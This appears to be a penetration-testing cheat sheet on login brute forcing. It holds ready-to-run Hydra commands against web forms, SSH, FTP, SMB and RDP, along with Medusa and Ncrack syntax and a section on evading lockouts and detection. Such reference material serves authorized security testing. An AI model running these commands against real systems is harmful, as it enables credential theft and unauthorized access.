# Log-in Brute Forcing

## Login Brute Forcing

Login brute-forcing is a systematic approach to discovering valid credentials by attempting numerous combinations against authentication systems. This technique uses computational power to test many possible username and password variations.

### Mathematical Complexity

The total possible combinations in a brute force attack can be calculated as:

```
Possible Combinations = Character Set Size^Password Length
```

For example:

* Lowercase letters only (26 characters): 26^8 = 208,827,064,576 combinations for an 8-character password
* Lowercase + uppercase (52 characters): 52^8 = 53,459,728,531,456 combinations
* Alphanumeric (62 characters): 62^8 = 218,340,105,584,896 combinations
* Full ASCII printable (95 characters): 95^8 = 6,634,204,312,890,625 combinations

### Attack Types

#### Dictionary Attack

Uses predefined lists of common usernames and passwords instead of generating all possibilities.

#### Hybrid Attack

Combines dictionary words with patterns, numbers, or special characters (e.g., password123, Password123!).

#### Rule-Based Attack

Applies transformation rules to dictionary words (capitalization, character substitution, etc.).

#### Credential Stuffing

Uses leaked credentials from other breaches to attempt access to different services.

### Tools

#### Hydra

Hydra is a parallelized login cracker that supports numerous protocols.

**Basic Syntax**

```bash
hydra -L [username list] -P [password list] [target] [protocol] "[path]:[form parameters]:[failed login message]"
```

**HTTP POST Form**

```bash
hydra -L users.txt -P passwords.txt 10.10.10.10 http-post-form "/login.php:username=^USER^&password=^PASS^:Invalid credentials"
```

**HTTP GET Form**

```bash
hydra -L users.txt -P passwords.txt 10.10.10.10 http-get "/login.php:username=^USER^&password=^PASS^:Login failed"
```

**SSH Brute Force**

```bash
hydra -L users.txt -P passwords.txt ssh://10.10.10.10
```

**FTP Brute Force**

```bash
hydra -L users.txt -P passwords.txt ftp://10.10.10.10
```

**SMB Brute Force**

```bash
hydra -L users.txt -P passwords.txt smb://10.10.10.10
```

**RDP Brute Force**

```bash
hydra -L users.txt -P passwords.txt rdp://10.10.10.10
```

**Additional Options**

```bash
# Stop after first valid credential pair
hydra -L users.txt -P passwords.txt -f 10.10.10.10 service

# Set number of parallel tasks
hydra -L users.txt -P passwords.txt -t 4 10.10.10.10 service

# Verbose output
hydra -L users.txt -P passwords.txt -V 10.10.10.10 service

# Custom port
hydra -L users.txt -P passwords.txt -s 8080 10.10.10.10 http-post-form
```

#### Medusa

```bash
medusa -h [host] -U [username list] -P [password list] -M [module]
```

#### Ncrack

```bash
ncrack -U [username list] -P [password list] [target]:[port]
```

### Defense Evasion

#### Rate Limiting

Space out login attempts to avoid triggering lockout policies:

```bash
hydra -L users.txt -P passwords.txt -t 1 -W 5 10.10.10.10 service
```

#### Targeted Usernames

Use validated usernames instead of large lists:

```bash
hydra -l admin -P passwords.txt 10.10.10.10 service
```

#### Custom User Agents

Use realistic user agents to avoid detection:

```bash
hydra -L users.txt -P passwords.txt http-post-form "/login:user=^USER^&pass=^PASS^:F=incorrect" -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
```

### Best Practices

1. **Always obtain proper authorization** before performing brute force attacks
2. **Document all testing** activities
3. **Use incremental approaches** starting with targeted attempts before wider brute forcing
4. **Monitor for account lockouts** to prevent denial of service
5. **Consider timing attacks** to minimize impact on production systems
